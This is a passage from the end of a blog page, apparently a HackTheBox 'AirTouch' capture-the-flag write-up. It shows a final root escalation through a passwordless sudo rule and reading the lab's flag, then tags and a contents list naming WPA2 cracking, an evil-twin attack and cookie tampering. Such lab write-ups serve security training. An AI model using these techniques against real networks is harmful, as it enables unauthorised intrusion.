class="line">    (ALL) NOPASSWD: ALL</span><br><span class="line">admin@AirTouch-AP-MGT:/etc/hostapd$ sudo su</span><br><span class="line">root@AirTouch-AP-MGT:/etc/hostapd# cd</span><br><span class="line">root@AirTouch-AP-MGT:~# ls</span><br><span class="line">certs  mgt  root.txt  start.sh  wlan_config_aps</span><br><span class="line">root@AirTouch-AP-MGT:~# cat root.txt</span><br><span class="line">e651d01aebe45d11022a4e9733e3bd34</span><br><span class="line">root@AirTouch-AP-MGT:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we are root.</p>
+<p>That was it for AirTouch, hope you learned something new! </p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Airtouch</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-04-18 16:31:16</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-18 19:26:57
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/04/18/Hackthebox-Airtouch/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/SNMP/">#SNMP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/WiFi/">#WiFi</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/WPA2-PSK/">#WPA2-PSK</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/WPA2-Enterprise/">#WPA2-Enterprise</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/aircrack-ng/">#aircrack-ng</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/EAPHammer/">#EAPHammer</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Evil-Twin/">#Evil Twin</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/MSCHAPv2/">#MSCHAPv2</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Cookie-Tampering/">#Cookie Tampering</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/File-Upload/">#File Upload</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/04/12/Hackthebox-Eighteen/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Eighteen</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Airtouch</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SNMP-Enumeration"><span class="nav-text">SNMP Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-consultant"><span class="nav-text">Foothold - consultant</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wireless-Recon-AirTouch-Internet"><span class="nav-text">Wireless Recon - AirTouch-Internet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cracking-the-WPA2-PSK-Handshake"><span class="nav-text">Cracking the WPA2-PSK Handshake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Joining-AirTouch-Internet"><span class="nav-text">Joining AirTouch-Internet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sniffing-Decrypted-Traffic"><span class="nav-text">Sniffing Decrypted Traffic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie-Tampering-Privilege-Bypass"><span class="nav-text">Cookie Tampering - Privilege Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement-user-AirTouch-AP-PSK"><span class="nav-text">Lateral Movement - user@AirTouch-AP-PSK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-PSK-AP"><span class="nav-text">Privilege Escalation - PSK AP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Targeting-AirTouch-Office-WPA2-Enterprise"><span class="nav-text">Targeting AirTouch-Office (WPA2-Enterprise)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Importing-Forged-Certificates"><span class="nav-text">Importing Forged Certificates</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Setting-Up-the-Rogue-Infrastructure"><span class="nav-text">Setting Up the Rogue Infrastructure</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Launching-the-Evil-Twin"><span class="nav-text">Launching the Evil Twin</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cracking-the-MSCHAPv2-Hash"><span class="nav-text">Cracking the MSCHAPv2 Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Joining-AirTouch-Office"><span class="nav-text">Joining AirTouch-Office</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivot-remote-AirTouch-AP-MGT"><span class="nav-text">Pivot - remote@AirTouch-AP-MGT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-Root"><span class="nav-text">Privilege Escalation - Root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
